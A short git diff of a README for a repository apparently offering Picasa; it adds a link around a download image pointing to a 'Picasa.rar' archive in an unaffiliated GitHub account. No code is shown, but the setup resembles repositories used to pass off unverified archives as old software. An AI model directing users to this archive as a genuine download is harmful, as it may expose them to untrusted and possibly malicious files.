@@ -9,7 +9,7 @@
 ![Windows XP](https://img.shields.io/badge/Windows%20xp-003399?style=for-the-badge&logo=windowsxp&logoColor=white)
 
 ## Download
-<img src="https://github.com/user-attachments/assets/9b083ee6-8f76-4e5b-a117-3302ef4adb3a">
+<a href="https://github.com/FLAdMITU/picasa/blob/main/Picasa.rar"><img src="https://github.com/user-attachments/assets/9b083ee6-8f76-4e5b-a117-3302ef4adb3a"></a>
 
 ## Rates
 Officially, support has been discontinued, but the program can still be downloaded and used to view offline photos. Unfortunately, synchronization and cloud storage will not work, since the related Google+ service is closed.
